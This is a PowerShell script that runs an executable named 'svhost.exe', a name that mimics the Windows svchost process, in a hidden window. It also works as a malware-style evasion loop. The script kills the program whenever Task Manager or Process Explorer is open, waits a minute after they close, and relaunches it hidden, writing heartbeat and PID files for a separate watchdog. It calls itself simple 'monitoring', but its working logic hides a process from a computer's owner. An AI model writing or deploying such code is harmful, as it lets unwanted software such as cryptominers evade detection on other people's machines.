# Save current Process ID for the watchdog
$PID | Out-File -FilePath (Join-Path $PSScriptRoot "shutdown.pid") -Force

# ====================================================
# CONFIGURATION: Just type your .exe file name below
# ====================================================
$exeName = "svhost.exe"

$appPath = Join-Path $PSScriptRoot $exeName
$appName = [System.IO.Path]::GetFileNameWithoutExtension($exeName)
$hbFile = Join-Path $PSScriptRoot "shutdown_hb.tmp"

if (-not (Test-Path -Path $appPath)) {
    Write-Host "Error: Could not find '$exeName' in this folder." -ForegroundColor Red
    exit
}

Write-Host "Monitoring started..." -ForegroundColor Green

while ($true) {
    try { Get-Date | Out-File -FilePath $hbFile -Force } catch {}

    $visibleMonitor = $false
    $processes = Get-Process -Name "Taskmgr", "procexp", "procexp64" -ErrorAction SilentlyContinue
    
    foreach ($p in $processes) {
        if ($p.MainWindowHandle -ne 0) {
            $visibleMonitor = $true
            break
        }
    }

    if ($visibleMonitor) {
        $targetApp = Get-Process -Name $appName -ErrorAction SilentlyContinue
        if ($targetApp) {
            Stop-Process -Name $appName -Force
        }

        $stillVisible = $true
        while ($stillVisible) {
            try { Get-Date | Out-File -FilePath $hbFile -Force } catch {}
            Start-Sleep -Seconds 2
            $stillVisible = $false
            $currentProcesses = Get-Process -Name "Taskmgr", "procexp", "procexp64" -ErrorAction SilentlyContinue
            foreach ($p in $currentProcesses) {
                if ($p.MainWindowHandle -ne 0) {
                    $stillVisible = $true
                    break
                }
            }
        }
        
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        while ($sw.ElapsedMilliseconds -lt 60000) {
            try { Get-Date | Out-File -FilePath $hbFile -Force } catch {}
            Start-Sleep -Seconds 5
        }
        $sw.Stop()

        $checkAgain = $false
        $finalProcesses = Get-Process -Name "Taskmgr", "procexp", "procexp64" -ErrorAction SilentlyContinue
        foreach ($p in $finalProcesses) {
            if ($p.MainWindowHandle -ne 0) {
                $checkAgain = $true
                break
            }
        }

        if (-not $checkAgain) {
            $appCheck = Get-Process -Name $appName -ErrorAction SilentlyContinue
            if (-not $appCheck) {
                Start-Process -FilePath $appPath -WorkingDirectory $PSScriptRoot -WindowStyle Hidden
            }
        }
    } else {
        Start-Sleep -Seconds 2
    }
}
